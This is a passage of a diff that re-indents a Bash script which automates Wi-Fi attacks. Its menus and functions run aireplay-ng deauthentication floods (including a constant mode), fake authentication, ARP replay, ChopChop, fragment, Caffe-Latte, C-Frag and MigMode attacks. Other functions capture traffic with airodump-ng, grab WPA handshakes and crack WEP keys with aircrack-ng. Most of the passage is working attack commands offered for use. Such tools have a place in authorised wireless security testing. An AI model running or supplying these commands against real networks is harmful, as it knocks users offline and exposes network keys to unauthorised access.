-"0")
-#blank=""
-initMonitorMode
-;;
+	"0")
+	#blank=""
+	initMonitorMode
+	;;
 
-esac
+	esac
 
 }
 
@@ -2811,171 +2823,171 @@ esac
 
 initMonitorMode(){
 
-currentTask="initMonitorMode"
+	currentTask="initMonitorMode"
 
-#killProcesses
-stopMonitorMode
+	#killProcesses
+	stopMonitorMode
 
-disableChannelHopping
-enableChannelHopping
+	disableChannelHopping
+	enableChannelHopping
 
-getWirelessInterfaces
+	getWirelessInterfaces
 
-banner
+	banner
 
-initMon=""
+	initMon=""
 
-case "$initMon" in
+	case "$initMon" in
 
-"")
-getMacAddress
-setMonitorMode
-getMacAddressMonitor
-getWirelessInterfaces
-;;
+	"")
+	getMacAddress
+	setMonitorMode
+	getMacAddressMonitor
+	getWirelessInterfaces
+	;;
 
-"M" | "m")
-menuMain
-;;
+	"M" | "m")
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-getMacAddress
-setMonitorMode
-getMacAddressMonitor
-getWirelessInterfaces
-;;
+	*)
+	getMacAddress
+	setMonitorMode
+	getMacAddressMonitor
+	getWirelessInterfaces
+	;;
 
-esac
+	esac
 
 }
 
 
 setMonitorMode(){
 
-currentTask="setMonitorMode"
+	currentTask="setMonitorMode"
 
-#interfaceMonitor="mon0"
-#echo "$interface"
-#read pause
-$startMonitorMode $interface
+	#interfaceMonitor="mon0"
+	#echo "$interface"
+	#read pause
+	$startMonitorMode $interface
 
 }
 
 
 stopMonitorMode(){
 
-currentTask="stopMonitorMode"
+	currentTask="stopMonitorMode"
 
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon0
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon1
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon2
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon3
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon4
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon5
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon6
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon7
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon8
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon9
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon10
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon11
-banner
-echo ""
-echo "Killing all active previous monitor mode interfaces...."
-echo ""
-echo ""
-$stopMonitorMode mon12
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon0
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon1
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon2
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon3
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon4
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon5
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon6
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon7
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon8
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon9
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon10
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon11
+	banner
+	echo ""
+	echo "Killing all active previous monitor mode interfaces...."
+	echo ""
+	echo ""
+	$stopMonitorMode mon12
 
-banner
+	banner
 
 }
 
@@ -2995,232 +3007,232 @@ banner
 
 autoModeUsePreviousSession(){
 
-currentTask="autoModeUsePreviousSession"
+	currentTask="autoModeUsePreviousSession"
 
-sessionCopyNewCaptureFiles
+	sessionCopyNewCaptureFiles
 
-case "$encryptionType" in
+	case "$encryptionType" in
 
-"wep")
-autoModeUsePreviousSessionWEP
-;;
+	"wep")
+	autoModeUsePreviousSessionWEP
+	;;
 
-"wps")
-autoModeUsePreviousSessionWPS
-;;
+	"wps")
+	autoModeUsePreviousSessionWPS
+	;;
 
-"wpa")
-autoModeUsePreviousSessionWPA
-;;
+	"wpa")
+	autoModeUsePreviousSessionWPA
+	;;
 
-"wpa2")
-autoModeUsePreviousSessionWPA2
-;;
+	"wpa2")
+	autoModeUsePreviousSessionWPA2
+	;;
 
-esac
+	esac
 
 }
 
 
 autoModeNoPreviousSession(){
 
-currentTask="autoModeNoPreviousSession"
+	currentTask="autoModeNoPreviousSession"
 
-case "$encryptionType" in
+	case "$encryptionType" in
 
-"wep")
-autoModeNoPreviousSessionWEP
-;;
+	"wep")
+	autoModeNoPreviousSessionWEP
+	;;
 
-"wps")
-autoModeNoPreviousSessionWPS
-;;
+	"wps")
+	autoModeNoPreviousSessionWPS
+	;;
 
-"wpa")
-autoModeNoPreviousSessionWPA
-;;
+	"wpa")
+	autoModeNoPreviousSessionWPA
+	;;
 
-"wpa2")
-autoModeNoPreviousSessionWPA2
-;;
+	"wpa2")
+	autoModeNoPreviousSessionWPA2
+	;;
 
-esac
+	esac
 
 }
 
 
 adFileDump(){
 
-currentTask="adFileDump"
+	currentTask="adFileDump"
 
-case "$encryptionType" in
+	case "$encryptionType" in
 
-"wep")
-adFileDumpWEP
-;;
+	"wep")
+	adFileDumpWEP
+	;;
 
-"wps")
-adFileDumpWPS
-;;
+	"wps")
+	adFileDumpWPS
+	;;
 
-"wpa")
-adFileDumpWPA
-;;
+	"wpa")
+	adFileDumpWPA
+	;;
 
-"wpa2")
-adFileDumpWPA2
-;;
+	"wpa2")
+	adFileDumpWPA2
+	;;
 
-esac
+	esac
 
 }
 
 
 adFileDumpNoChannel(){
 
-currentTask="adFileDumpNoChannel"
+	currentTask="adFileDumpNoChannel"
 
-case "$encryptionType" in
+	case "$encryptionType" in
 
-"wep")
-adFileDumpNoChannelWEP
-;;
+	"wep")
+	adFileDumpNoChannelWEP
+	;;
 
-"wps")
-adFileDumpNoChannelWPS
-;;
+	"wps")
+	adFileDumpNoChannelWPS
+	;;
 
-"wpa")
-adFileDumpNoChannelWPA
-;;
+	"wpa")
+	adFileDumpNoChannelWPA
+	;;
 
-"wpa2")
-adFileDumpNoChannelWPA2
-;;
+	"wpa2")
+	adFileDumpNoChannelWPA2
+	;;
 
-esac
+	esac
 
 }
 
 
 aircrackDecrypt(){
 
-currentTask="aircrackDecrypt"
+	currentTask="aircrackDecrypt"
 
-sessionCopyNewCaptureFiles
+	sessionCopyNewCaptureFiles
 
-case "$encryptionType" in
+	case "$encryptionType" in
 
-"wep")
-aircrackDecryptWEP
-;;
+	"wep")
+	aircrackDecryptWEP
+	;;
 
-"wps")
-aircrackDecryptWPS
-;;
+	"wps")
+	aircrackDecryptWPS
+	;;
 
-"wpa")
-aircrackDecryptWPA
-;;
+	"wpa")
+	aircrackDecryptWPA
+	;;
 
-"wpa2")
-aircrackDecryptWPA2
-;;
+	"wpa2")
+	aircrackDecryptWPA2
+	;;
 
-esac
+	esac
 
 }
 
 
 adAPScan(){
 
-currentTask="adAPScan"
+	currentTask="adAPScan"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
-$terminal airodump-ng --channel $channel -i $interfaceMonitor &
-#$terminal airodump-ng --ignore-negative-one --channel $channel -i $interfaceMonitor &
-#read pause
+	$terminal airodump-ng --channel $channel -i $interfaceMonitor &
+	#$terminal airodump-ng --ignore-negative-one --channel $channel -i $interfaceMonitor &
+	#read pause
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 
 adAPScanWifiteWPS(){
 
-currentTask="adAPScanWifiteWPS"
+	currentTask="adAPScanWifiteWPS"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
-$terminal $wifiteAttackWPS -c $channel -i $interfaceMonitor &
+	$terminal $wifiteAttackWPS -c $channel -i $interfaceMonitor &
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 
 adAPScanWifiteWEP(){
 
-currentTask="adAPScanWifiteWEP"
+	currentTask="adAPScanWifiteWEP"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
-$terminal $wifiteAttackWEP -c $channel -i $interfaceMonitor &
+	$terminal $wifiteAttackWEP -c $channel -i $interfaceMonitor &
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 
 adAPScanNoChannel(){
 
-currentTask="adAPScanNoChannel"
+	currentTask="adAPScanNoChannel"
 
-echo ""
-echo ""
-$terminal airodump-ng -i $interfaceMonitor &
-#$terminal airodump-ng --ignore-negative-one -i $interfaceMonitor &
-#read pause
+	echo ""
+	echo ""
+	$terminal airodump-ng -i $interfaceMonitor &
+	#$terminal airodump-ng --ignore-negative-one -i $interfaceMonitor &
+	#read pause
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 
 adAPScanWifiteWPSNoChannel(){
 
-currentTask="adAPScanWifiteWPSNoChannel"
+	currentTask="adAPScanWifiteWPSNoChannel"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
-$terminal $wifiteAttackWPS -i $interfaceMonitor &
+	$terminal $wifiteAttackWPS -i $interfaceMonitor &
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 
 adAPScanWifiteWEPNoChannel(){
 
-currentTask="adAPScanWifiteWEPNoChannel"
+	currentTask="adAPScanWifiteWEPNoChannel"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
-$terminal $wifiteAttackWEP -i $interfaceMonitor &
+	$terminal $wifiteAttackWEP -i $interfaceMonitor &
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
@@ -3240,460 +3252,460 @@ echo ""
 
 autoModeNoPreviousSessionWEP(){
 
-currentTask="autoModeNoPreviousSessionWEP"
+	currentTask="autoModeNoPreviousSessionWEP"
 
-adAPScanNoChannel
+	adAPScanNoChannel
 
-sleepMessage="Setting Up User Input...."
-doSleepMessage
-sleep 2
+	sleepMessage="Setting Up User Input...."
+	doSleepMessage
+	sleep 2
 
-getESSID
-getBSSID
-getChannel
+	getESSID
+	getBSSID
+	getChannel
 
-sessionWriteBeginNew
-sessionCopyNewCaptureFiles
+	sessionWriteBeginNew
+	sessionCopyNewCaptureFiles
 
-sleepMessage="Killing airodump-ng Sessions...."
-doSleepMessage
-sleep 2
+	sleepMessage="Killing airodump-ng Sessions...."
+	doSleepMessage
+	sleep 2
 
-killAirodump
-killWifite
+	killAirodump
+	killWifite
 
-sleepMessage="Preparing Client Association...."
-doSleepMessage
-sleep 2
+	sleepMessage="Preparing Client Association...."
+	doSleepMessage
+	sleep 2
 
-arAssociate
-#sleep 10
-#killAireplay
+	arAssociate
+	#sleep 10
+	#killAireplay
 
-sleepMessage="Preparing airodump-ng Session...."
-doSleepMessage
-sleep 2
+	sleepMessage="Preparing airodump-ng Session...."
+	doSleepMessage
+	sleep 2
 
-adFileDump
-menuAttacksWEP
+	adFileDump
+	menuAttacksWEP
 
 }
 
 
 autoModeUsePreviousSessionWEP(){
 
-currentTask="autoModeUsePreviousSessionWEP"
+	currentTask="autoModeUsePreviousSessionWEP"
 
-sessionWriteLoadPrevious
+	sessionWriteLoadPrevious
 
 
-sleepMessage="Preparing Client Association...."
-doSleepMessage
-sleep 2
+	sleepMessage="Preparing Client Association...."
+	doSleepMessage
+	sleep 2
 
-arAssociate
+	arAssociate
 
-sleepMessage="Preparing airodump-ng Session...."
-doSleepMessage
-sleep 2
+	sleepMessage="Preparing airodump-ng Session...."
+	doSleepMessage
+	sleep 2
 
-adFileDump
+	adFileDump
 
-menuAttacksWEP
+	menuAttacksWEP
 
 }
 
 
 menuAttacksWEP(){
 
-currentTask="menuAttacksWEP"
-lastMenuID="menuAttacksWEP"
+	currentTask="menuAttacksWEP"
+	lastMenuID="menuAttacksWEP"
 
-sessionCopyNewCaptureFiles
+	sessionCopyNewCaptureFiles
 
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "Choose an attack to perform and press ENTER:"
-echo ""
-echo ""
-echo "1) De-Auth (De-Authenticate All Stations) (0=Constant)"
-echo "2) Fake Auth (Fake Authentication with AP)"
-echo "3) Interactive Attack (Interactive Frame Selection)"
-echo "4) ARP Replay (Standard ARP Request Replay)"
-echo "5) ChopChop Atack (Decrypt WEP Packets)"
-echo "6) Fragment Attack (Generates a Valid Keystream)"
-echo "7) Caffe-Latte Attack (Query Client for New IV's)"
-echo "8) C-Frag (Fragments Against a Client)"
-echo "9) MigMode (Attacks WPA Migration Mode)"
-echo ""
-echo "R) Re-Associate (Associate with Client)"
-echo "N) Start New Capture (Log to a new CAP file)"
-echo "T) Test (Tests Injection and Quality)"
-echo ""
-echo "C) Run Aircrack (Crack WEP Key) **If decryption fails, press ENTER from aircrack to return here**"
-echo ""
+	echo ""
+	echo "Choose an attack to perform and press ENTER:"
+	echo ""
+	echo ""
+	echo "1) De-Auth (De-Authenticate All Stations) (0=Constant)"
+	echo "2) Fake Auth (Fake Authentication with AP)"
+	echo "3) Interactive Attack (Interactive Frame Selection)"
+	echo "4) ARP Replay (Standard ARP Request Replay)"
+	echo "5) ChopChop Atack (Decrypt WEP Packets)"
+	echo "6) Fragment Attack (Generates a Valid Keystream)"
+	echo "7) Caffe-Latte Attack (Query Client for New IV's)"
+	echo "8) C-Frag (Fragments Against a Client)"
+	echo "9) MigMode (Attacks WPA Migration Mode)"
+	echo ""
+	echo "R) Re-Associate (Associate with Client)"
+	echo "N) Start New Capture (Log to a new CAP file)"
+	echo "T) Test (Tests Injection and Quality)"
+	echo ""
+	echo "C) Run Aircrack (Crack WEP Key) **If decryption fails, press ENTER from aircrack to return here**"
+	echo ""
 
-read getBSSID
+	read getBSSID
 
-case "$getBSSID" in
+	case "$getBSSID" in
 
-"")
-menuAttacksWEP
-;;
+	"")
+	menuAttacksWEP
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-"C" | "c")
-aircrackDecrypt
-;;
+	"C" | "c")
+	aircrackDecrypt
+	;;
 
-"R" | "r")
-arAssociate
-;;
+	"R" | "r")
+	arAssociate
+	;;
 
-"T" | "t")
-arAttackTest
-;;
+	"T" | "t")
+	arAttackTest
+	;;
 
-"N" | "n")
-adFileDump
-;;
+	"N" | "n")
+	adFileDump
+	;;
 
-"0")
-arAttackDeAuthConstant
-;;
+	"0")
+	arAttackDeAuthConstant
+	;;
 
-"1")
-arAttackDeAuth
-;;
+	"1")
+	arAttackDeAuth
+	;;
 
-"2")
-arAttackFakeAuth
-;;
+	"2")
+	arAttackFakeAuth
+	;;
 
-"3")
-arAttackInteractive
-;;
+	"3")
+	arAttackInteractive
+	;;
 
-"4")
-arAttackArpReplay
-;;
+	"4")
+	arAttackArpReplay
+	;;
 
-"5")
-arAttackChopChop
-;;
+	"5")
+	arAttackChopChop
+	;;
 
-"6")
-arAttackFragment
-;;
+	"6")
+	arAttackFragment
+	;;
 
-"7")
-arAttackCaffeLatte
-;;
+	"7")
+	arAttackCaffeLatte
+	;;
 
-"8")
-arAttackCfrag
-;;
+	"8")
+	arAttackCfrag
+	;;
 
-"9")
-arAttackMigMode
-;;
+	"9")
+	arAttackMigMode
+	;;
 
-*)
-menuAttacksWEP
-;;
+	*)
+	menuAttacksWEP
+	;;
 
-esac
+	esac
 
-menuAttacksWEP
+	menuAttacksWEP
 
 }
 
 
 menuAttacksWEPWifiteAuto(){
 
-currentTask="menuAttacksWEPWifiteAuto"
-lastMenuID="menuAttacksWEPWifiteAuto"
+	currentTask="menuAttacksWEPWifiteAuto"
+	lastMenuID="menuAttacksWEPWifiteAuto"
 
-killAll
+	killAll
 
-#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
-$terminal $wifiteAttackWEP -wepsave -wepca 1000 &
+	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
+	$terminal $wifiteAttackWEP -wepsave -wepca 1000 &
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "The wifite session should be launched in a separate window."
-echo ""
-echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
-echo ""
-echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
-echo ""
+	echo ""
+	echo "The wifite session should be launched in a separate window."
+	echo ""
+	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
+	echo ""
+	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
+	echo ""
 
-read pause
+	read pause
 
-killAll
-menuAuto
+	killAll
+	menuAuto
 
 }
 
 
 arAssociate(){
 
-currentTask="arAssociate"
+	currentTask="arAssociate"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
-$terminal aireplay-ng -1 6000 -e $essid -a $bssid -h $macAddressMonitor $interfaceMonitor &
+	$terminal aireplay-ng -1 6000 -e $essid -a $bssid -h $macAddressMonitor $interfaceMonitor &
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 
 adFileDumpWEP(){
 
-currentTask="adFileDumpWEP"
+	currentTask="adFileDumpWEP"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
-disableChannelHopping
+	disableChannelHopping
 
-$terminal airodump-ng -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
-#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
-#read pause
+	$terminal airodump-ng -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+	#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+	#read pause
 
-#Working (uses session path)
-#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+	#Working (uses session path)
+	#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 adFileDumpNoChannelWEP(){
 
-currentTask="adFileDumpNoChannelWEP"
+	currentTask="adFileDumpNoChannelWEP"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
-$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
-#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
-#read pause
+	$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
+	#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
+	#read pause
 
-#Working (uses session path)
-#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
+	#Working (uses session path)
+	#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 
 arAttackDeAuth(){
 
-currentTask="arAttackDeAuth"
+	currentTask="arAttackDeAuth"
 
-retryDeauth="0"
+	retryDeauth="0"
 
-sleepMessage="Preparing to De-Authenticate All Connected Stations...."
-doSleepMessage
-sleep 2
+	sleepMessage="Preparing to De-Authenticate All Connected Stations...."
+	doSleepMessage
+	sleep 2
 
-$terminal aireplay-ng --deauth 5 -a $bssid $interfaceMonitor &
+	$terminal aireplay-ng --deauth 5 -a $bssid $interfaceMonitor &
 
-sleepMessage="De-Authenticating All Connected Stations...."
-doSleepMessage
-sleep 5
+	sleepMessage="De-Authenticating All Connected Stations...."
+	doSleepMessage
+	sleep 5
 
 }
 
 
 arAttackDeAuthOnRetry(){
 
-currentTask="arAttackDeAuthOnRetry"
+	currentTask="arAttackDeAuthOnRetry"
 
-retryDeauth="0"
+	retryDeauth="0"
 
-sleepMessage="Preparing to De-Authenticate All Connected Stations...."
-doSleepMessage
-sleep 2
+	sleepMessage="Preparing to De-Authenticate All Connected Stations...."
+	doSleepMessage
+	sleep 2
 
-$terminal aireplay-ng --deauth 5 -a $bssid $interfaceMonitor &
+	$terminal aireplay-ng --deauth 5 -a $bssid $interfaceMonitor &
 
-sleepMessage="De-Authenticating All Connected Stations...."
-doSleepMessage
-sleep 5
+	sleepMessage="De-Authenticating All Connected Stations...."
+	doSleepMessage
+	sleep 5
 
 }
 
 
 arAttackDeAuthConstant(){
 
-currentTask="arAttackDeAuthConstant"
+	currentTask="arAttackDeAuthConstant"
 
-retryDeauth="0"
+	retryDeauth="0"
 
-sleepMessage="De-Authenticating All Connected Stations...."
-doSleepMessage
-sleep 2
+	sleepMessage="De-Authenticating All Connected Stations...."
+	doSleepMessage
+	sleep 2
 
-$terminal aireplay-ng --deauth 0 -a $bssid $interfaceMonitor &
+	$terminal aireplay-ng --deauth 0 -a $bssid $interfaceMonitor &
 
 }
 
 
 arAttackFakeAuth(){
 
-currentTask="arAttackFakeAuth"
+	currentTask="arAttackFakeAuth"
 
-$terminal aireplay-ng -1 1 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &
+	$terminal aireplay-ng -1 1 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &
 
 }
 
 
 arAttackInteractive(){
 
-currentTask="arAttackInteractive"
+	currentTask="arAttackInteractive"
 
-$terminal aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -a $bssid -h $macAddressMonitor $interfaceMonitor &
+	$terminal aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -a $bssid -h $macAddressMonitor $interfaceMonitor &
 
 }
 
 
 arAttackArpReplay(){
 
-currentTask="arAttackArpReplay"
+	currentTask="arAttackArpReplay"
 
-$terminal aireplay-ng -3 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &
+	$terminal aireplay-ng -3 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &
 
 }
 
 
 arAttackChopChop(){
 
-currentTask="arAttackChopChop"
+	currentTask="arAttackChopChop"
 
-$terminal aireplay-ng -4 -a $bssid -h $macAddressMonitor $interfaceMonitor &
+	$terminal aireplay-ng -4 -a $bssid -h $macAddressMonitor $interfaceMonitor &
 
 }
 
 
 arAttackFragment(){
 
-currentTask="arAttackFragment"
+	currentTask="arAttackFragment"
 
-$terminal aireplay-ng -5 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &
+	$terminal aireplay-ng -5 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &
 
 }
 
 
 arAttackCaffeLatte(){
 
-currentTask="arAttackCaffeLatte"
+	currentTask="arAttackCaffeLatte"
 
-$terminal aireplay-ng -6 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &
+	$terminal aireplay-ng -6 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &
 
 }
 
 
 arAttackCfrag(){
 
-currentTask="arAttackCfrag"
+	currentTask="arAttackCfrag"
 
-$terminal aireplay-ng -7 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &
+	$terminal aireplay-ng -7 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &
 
 }
 
 
 arAttackMigMode(){
 
-currentTask="arAttackMigMode"
+	currentTask="arAttackMigMode"
 
-$terminal aireplay-ng -8 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &
+	$terminal aireplay-ng -8 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &
 
 }
 
 
 arAttackTest(){
 
-currentTask="arAttackTest"
+	currentTask="arAttackTest"
 
-$terminal aireplay-ng -9 -e $essid -a $bssid -h $macAddressMonitor $interfaceMonitor &
+	$terminal aireplay-ng -9 -e $essid -a $bssid -h $macAddressMonitor $interfaceMonitor &
 
 }
 
 aircrackDecryptWEP(){
 
-currentTask="aircrackDecryptWEP"
+	currentTask="aircrackDecryptWEP"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "Preparing capture files for aircrack-ng...."
-echo ""
-echo ""
+	echo ""
+	echo "Preparing capture files for aircrack-ng...."
+	echo ""
+	echo ""
 
 
-aircrack-ng -e "$essid" -b $bssid -l "key_$essid" *.cap *.ivs&
+	aircrack-ng -e "$essid" -b $bssid -l "key_$essid" *.cap *.ivs&
 
-#echo ""
-#echo ""
-#echo ""
-#echo "FOUND KEY: "
-echo ""
-echo ""
-echo ""
-echo "Press ENTER to return to Attacks Menu...."
-echo ""
-echo ""
+	#echo ""
+	#echo ""
+	#echo ""
+	#echo "FOUND KEY: "
+	echo ""
+	echo ""
+	echo ""
+	echo "Press ENTER to return to Attacks Menu...."
+	echo ""
+	echo ""
 
-read acPause
+	read acPause
 
-menuAttacksWEP
+	menuAttacksWEP
 
 }
 
@@ -3713,417 +3725,417 @@ menuAttacksWEP
 
 autoModeNoPreviousSessionWPA(){
 
-currentTask="autoModeNoPreviousSessionWPA"
+	currentTask="autoModeNoPreviousSessionWPA"
 
-adAPScanNoChannel
+	adAPScanNoChannel
 
-sleepMessage="Setting Up User Input...."
-doSleepMessage
-sleep 2
+	sleepMessage="Setting Up User Input...."
+	doSleepMessage
+	sleep 2
 
-getESSID
-getBSSID
-getChannel
+	getESSID
+	getBSSID
+	getChannel
 
-sessionWriteBeginNew
-sessionCopyNewCaptureFiles
+	sessionWriteBeginNew
+	sessionCopyNewCaptureFiles
 
-sleepMessage="Killing Airodump Window...."
-doSleepMessage
-sleep 2
-
-
-killAirodump
+	sleepMessage="Killing Airodump Window...."
+	doSleepMessage
+	sleep 2
 
 
-menuAttacksWPA
+	killAirodump
 
-echo ""
-echo ""
-echo "Press any key to continue...."
-echo ""
-echo ""
 
-read pause
+	menuAttacksWPA
+
+	echo ""
+	echo ""
+	echo "Press any key to continue...."
+	echo ""
+	echo ""
+
+	read pause
 
 }
 
 
 autoModeUsePreviousSessionWPA(){
 
-currentTask="autoModeUsePreviousSessionWPA"
+	currentTask="autoModeUsePreviousSessionWPA"
 
-sessionWriteLoadPrevious
+	sessionWriteLoadPrevious
 
-menuAttacksWPA
+	menuAttacksWPA
 
 
-echo ""
-echo ""
-echo "Press any key to continue...."
-echo ""
-echo ""
+	echo ""
+	echo ""
+	echo "Press any key to continue...."
+	echo ""
+	echo ""
 
-read pause
+	read pause
 
 }
 
 
 menuAttacksWPA(){
 
-currentTask="menuAttacksWPA"
+	currentTask="menuAttacksWPA"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-# Only run a deauth with default text and settings if not re-forced through menu
-case "$retryDeauth" in
+	# Only run a deauth with default text and settings if not re-forced through menu
+	case "$retryDeauth" in
 
-"0")
-killAll
+	"0")
+	killAll
 
-adFileDump
+	adFileDump
 
-sleepMessage="Preparing to Capture WPA Handshake...."
-doSleepMessage
-sleep 2
+	sleepMessage="Preparing to Capture WPA Handshake...."
+	doSleepMessage
+	sleep 2
 
-arAttackDeAuth
-captureHandshakeWPA
-;;
+	arAttackDeAuth
+	captureHandshakeWPA
+	;;
 
-"1")
-sleepMessage="Preparing to De-Authenticate All Connected Stations...."
